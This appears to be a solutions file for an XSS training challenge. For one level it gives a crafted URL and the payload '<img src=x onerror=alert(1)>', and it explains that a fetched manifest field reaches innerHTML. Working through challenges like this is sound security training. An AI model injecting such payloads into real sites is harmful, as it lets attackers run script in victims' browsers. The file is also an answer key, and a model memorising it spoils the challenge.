# manifest — solutions

Page fetches its own manifest.json and innerHTMLs a field; client-side sink.

### manifest-level1

`/manifest/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: query.to_json embedded in inline script then fetched manifest's description fed to innerHTML
